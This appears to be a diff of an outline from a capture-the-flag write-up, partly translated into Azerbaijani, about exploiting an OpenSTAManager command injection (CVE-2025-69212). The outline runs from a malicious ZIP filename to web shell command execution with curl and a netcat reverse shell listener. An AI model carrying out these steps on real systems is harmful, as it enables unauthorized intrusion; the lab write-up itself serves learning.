@@ -29,7 +29,7 @@ Kəşfiyyat
 
 İstismar (OpenSTAManager CVE-2025-69212)
 ├── Version: 2.9.8 (info.php)
-├── OS Command Injection via P7M files (decodeP7M → exec without escaping)
+├── P7M faylları vasitəsilə OS Command inyeksiyası (decodeP7M → escaping olmadan icra)
 ├── ZIP with malicious filename → Sales → Invoices → Importazione FE
 ├── curl "http://support_001.enigma.htb/files/SHELL.php?c=id" → www-data
 └── Reverse shell: nc -lvnp 4444
